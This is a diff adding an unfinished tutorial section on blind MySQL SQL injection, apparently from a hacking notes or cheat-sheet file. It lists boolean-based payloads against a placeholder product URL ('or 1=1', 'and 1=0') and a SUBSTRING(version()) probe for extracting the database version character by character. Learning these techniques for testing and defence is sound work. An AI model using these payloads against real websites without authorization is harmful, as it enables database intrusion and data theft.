@@ -125,5 +125,42 @@
 
 
 ## Blind MySQL SQL Injection
+⚠️ Blind SQL Injection is very lengthy and tedious process.
+
+### 1) Break the Query.
+- follow the same methods as mentioned above.
+
+### 2) Fix the Query.
+- follow the same methods as mentioned above.
+
+### 3) Check for the Blind SQL Injection.
+- now, after fixing the query, it's time to check for the probability of blind sql injection whether it is possible or not.
+- to check for blind sql injection we use something like this,
+  - https://website.com/product/id?=23' or 1=0,
+  - https://website.com/product/id?=23' or 1=1
+  - https://website.com/product/id?=23' and 1=0,
+  - https://website.com/product/id?=23' and 1=1
+    - backend query look like this,
+      - `SELECT product FROM stock WHERE ID = ‘23’ or 1=1;` <- returns true
+      - `SELECT product FROM stock WHERE ID = ‘23’ or 1=0;` <- returns false
+      - `SELECT product FROM stock WHERE ID = ‘23’ and 1=1;` <- returns true
+      - `SELECT product FROM stock WHERE ID = ‘23’ and 1=0;` <- returns false
+  - for example,
+    1. if `or 1=0` breaks something on website or website act wiredly,
+    2. now try `or 1=1`.
+    3. now, if website gets back to it's normal stage, cogratulations, blind sql injection is possible. 🙂
+
+### 4) Exploit. (get the data from database)
+- yes, you heard it right. now, we're ready to exploit the database. no need to find total columns and vulnerable columns. 🙂
+- but, this comes with it's own price. it's a tedious task. 😞
+
+- **get the version**
+  - let's suppose the version is `5.6.41-84.1`. (it's blind sql injection, we've to guess everything. 😃)
+  - so, we can do like this,
+    1. https://website.com/product/id?=23' and SUBSTRING(version(),1,1)=1
+    2. here, `SUBSTRING(version(),1,1)=1` means, get the first letter of version.
+    3. we used, SUBSTRING(version(),***1,1)=1***. means, is first letter of verssion is = to 1 or not?
+    4. 
+
 
 **Note:** not completed. to be continued...
